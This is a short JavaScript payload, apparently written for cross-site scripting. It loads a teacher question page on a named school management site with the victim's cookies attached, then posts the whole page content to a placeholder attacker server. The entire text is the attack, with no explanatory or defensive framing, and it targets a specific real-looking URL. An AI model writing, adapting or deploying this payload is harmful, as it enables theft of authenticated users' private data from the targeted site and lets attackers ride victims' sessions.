const targetURL = 'https://mis.khurasan.info/teacher/q_view_long?subjectID=327';

fetch(targetURL, {
  credentials: 'include' // Ensures cookies are sent with the request
})
.then(response => response.text())
.then(data => {
  fetch('http://your-attacker-server.com/receive.php', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: 'content=' + encodeURIComponent(data) + '&subjectID=327'
  });
})
.catch(error => console.error('Error:', error));
